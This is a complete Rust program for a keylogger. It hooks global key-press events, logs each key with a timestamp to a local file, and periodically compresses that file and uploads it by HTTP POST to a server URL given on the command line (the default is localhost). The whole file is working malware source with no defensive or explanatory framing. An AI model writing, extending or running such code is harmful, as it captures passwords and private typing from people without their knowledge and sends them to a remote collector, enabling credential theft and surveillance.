use std::{fs::File, io::{BufWriter, Read, Write}, time::{SystemTime, UNIX_EPOCH}};
use flate2::{write::GzEncoder, Compression};
use rdev::{listen, Event, EventType};
use serde::Serialize;
use reqwest::Client;
use tokio::{select, sync::watch};

#[derive(Serialize)]
struct KeyEvent {
    time: u64,
    key: String,
}

fn unix_now() -> u64 {
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs();
    secs
}

fn unix_minute_now() -> u64 {
    unix_now() / 60
}


fn append_event<W>(
    w: &mut W,
    event: KeyEvent
) -> std::io::Result<()>
where
    W: Write
{
    let value = serde_json::to_string(&event)?;
    w.write_all(format!("{}\n", value).as_bytes())?;
    Ok(())
}

fn create_callback(
    mut writer: BufWriter<File>
) -> Box<dyn FnMut(Event) + Send> {
    let mut current_minute = unix_minute_now();

    let cb = move |event: Event| {
        if let EventType::KeyPress(key) = event.event_type {
            let m = unix_minute_now();
            if let Err(e) = append_event(
                &mut writer,
                KeyEvent { time: unix_now(), key: format!("{:?}", key) }
            ) {
                println!("Failed to write to file: {}", e);
            }

            if m != current_minute {
                if let Err(e) = writer.flush() {
                    println!("Failed to flush file: {}", e);
                }
                current_minute = m;
            }
        }
    };
    Box::new(cb)
}

fn gzip_file_to_vec(path: &str) -> anyhow::Result<Vec<u8>> {
    let mut input = File::open(path)?;
    let mut buf = Vec::new();

    input.read_to_end(&mut buf)?;

    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(&buf)?;
    let compressed = encoder.finish()?;
    Ok(compressed)
}

async fn upload_keylog(
    url: &str,
    path: &str,
) -> anyhow::Result<()> {
    let temp_path = format!("{}.upload", path);
    std::fs::copy(path, &temp_path)?;
    
    let compressed = gzip_file_to_vec(&temp_path)?;
    
    let form = reqwest::multipart::Form::new()
        .part("file", reqwest::multipart::Part::bytes(compressed)
            .file_name("keylog.ndjson.gz")
            .mime_str("application/gzip")?);
    
    let response = Client::new()
        .post(url)
        .multipart(form)
        .send()
        .await?;

    let _ = std::fs::remove_file(&temp_path);

    if !response.status().is_success() {
        return Err(anyhow::anyhow!(
            "Failed to upload file: {}",
            response.status()
        ));
    }
    Ok(())
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {

    let mut args = std::env::args().skip(1);
    let url = args
        .next()
        .unwrap_or_else(|| "http://127.0.0.1:8080/api/upload".to_string());

    let path = args
        .next()
        .unwrap_or_else(|| "keylog.ndjson".to_string());

    let wait_secs: u64 = args
        .next()
        .map(|s| s.parse().unwrap_or(60))
        .unwrap_or(60);

    let current_file = format!("{}.current", path);
    let file = File::options()
        .create(true)
        .append(true)
        .open(&current_file)?;
    let writer = BufWriter::new(file);
    let callback = create_callback(writer);
    let (stop_tx, mut stop_rx) = watch::channel(false);

    let send_thread = tokio::spawn(async move {
        let mut tick = tokio::time::interval(
            std::time::Duration::from_secs(wait_secs)
        );

        loop {
            select! {
                _ = tick.tick() => {
                    if std::path::Path::new(&current_file).metadata().map(|m| m.len()).unwrap_or(0) > 0 {
                        if let Err(e) = std::fs::rename(&current_file, &path) {
                            println!("Failed to rotate file: {}", e);
                        } else {
                            let _ = File::options()
                                .create(true)
                                .write(true)
                                .open(&current_file);
                            
                            if let Err(error) = upload_keylog(&url, &path).await {
                                println!("Error: {:?}", error);
                            }
                        }
                    }
                }
                _ = stop_rx.changed() => {
                    if *stop_rx.borrow() {
                        break;
                    }
                }
            }
        }
    });

    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error);
    }
    stop_tx.send(true)?;
    let _ = send_thread.await?;
    Ok(())
}
